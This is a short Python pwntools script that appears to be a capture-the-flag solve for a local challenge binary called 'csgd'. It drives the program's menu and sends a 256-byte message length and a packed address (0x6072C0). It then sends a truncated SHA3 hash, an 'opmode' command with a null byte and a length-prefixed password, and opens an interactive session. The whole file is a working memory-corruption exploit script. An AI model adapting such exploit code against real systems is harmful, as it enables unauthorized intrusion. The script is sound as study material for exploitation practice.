from pwn import *
#import hashlib
import sha3

context.log_level = "debug"
hash = sha3.sha3_256(b"1234").digest()[0:3]
p = process("./csgd")
p.recvuntil(b"csgd's revenge\n")
p.send(b"yy\n")
p.send(b"yy\n")

p.send(b"y~\n")
p.recvuntil(b"what is the length of your message?\n")
p.sendline(b"256")
p.recvuntil(b"To ALL: ")

p.sendline(p64(0x6072C0))
p.recvline()
p.send(hash)
p.recvuntil("# ")
p.sendline(b"opmode\x00")
p.recv()

p.send(p32(4)+b"1234")

p.interactive()